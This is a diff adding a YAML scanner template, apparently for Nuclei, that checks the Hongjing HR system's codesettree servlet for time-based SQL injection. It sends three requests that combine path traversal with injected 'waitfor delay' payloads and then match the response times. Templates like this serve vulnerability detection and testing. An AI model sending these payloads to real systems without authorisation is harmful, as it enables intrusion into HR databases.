@@ -1,0 +1,39 @@
+id: hongjing-codesettree-sqli
+info:
+  name: 宏景HR系统-codesettree接口sql注入漏洞
+  author: apple
+  severity: high
+  description: 宏景HR系统-codesettree接口sql注入漏洞
+  reference:
+    - https://github.com/dioos886/2024-POC/blob/main/%E5%AE%8F%E6%99%AFHR%E7%B3%BB%E7%BB%9F-codesettree%E6%8E%A5%E5%8F%A3sql%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md 
+  tags: tags
+http:
+  - raw:
+      - |-
+        GET /templates/attestation/../../servlet/codesettree?flag=3&codesetid=111';waitfor+delay+'0:0:3'--+&parentid=-1&fromflag=" HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+      - |-
+        GET /templates/attestation/../../servlet/codesettree?flag=3&codesetid=111';waitfor+delay+'0:0:6'--+&parentid=-1&fromflag=" HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+      - |-
+        GET /templates/attestation/../../servlet/codesettree?flag=3&codesetid=111';waitfor+delay+'0:0:9'--+&parentid=-1&fromflag=" HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:50.0)
+        Accept-Encoding: gzip, deflate
+        Accept: */*
+        Connection: close
+    matchers:
+      - type: dsl
+        condition: and
+        dsl:
+          - "duration_1>=3  && duration_1<=6"
+          - "duration_2>=6  && duration_2<=9"
+          - "duration_3>=9  && duration_3<=12"
